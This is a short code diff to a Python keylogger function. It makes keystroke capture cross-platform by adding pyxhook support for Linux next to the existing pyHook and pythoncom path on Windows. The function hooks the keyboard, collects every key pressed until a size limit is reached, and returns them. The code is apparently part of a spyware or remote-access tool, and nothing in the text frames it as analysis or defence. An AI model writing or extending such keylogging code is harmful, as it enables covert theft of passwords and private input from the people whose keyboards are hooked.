@@ -1,5 +1,4 @@
 import sys
-import pyHook
 import os
 
 keysPressed = ">"
@@ -20,15 +19,22 @@ def keylogger(size):
         import pythoncom
         from pyHook import HookManager
     else:
+        import pyxhook
         from pyxhook import HookManager
     global keysPressed
     hm = HookManager()
     hm.KeyDown = onkeyboardevent
     hm.HookKeyboard()
+    if os.name != "nt":
+        hm.start()
     while len(keysPressed) < int(size):
-        pythoncom.PumpWaitingMessages()
+        if os.name == "nt":
+            pythoncom.PumpWaitingMessages()
     else:
         keys = keysPressed
         keysPressed = ">"
-        hm.UnhookKeyboard()
+        if os.name == "nt":
+            hm.UnhookKeyboard()
+        else:
+            hm.cancel()
         return keys
